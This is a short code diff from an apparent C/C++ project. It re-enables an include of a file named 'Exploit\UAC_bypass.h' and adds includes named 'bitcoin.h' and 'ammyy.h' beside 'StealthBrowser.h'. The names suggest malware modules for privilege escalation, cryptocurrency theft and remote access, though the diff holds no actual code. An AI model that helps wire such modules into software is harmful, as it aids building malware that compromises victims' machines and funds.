@@ -42,5 +42,7 @@
 	
 #include "StealthBrowser.h"
 
-//#include "Exploit\\UAC_bypass.h"
+#include "Exploit\\UAC_bypass.h"
 
+#include "bitcoin.h"
+#include "ammyy.h"
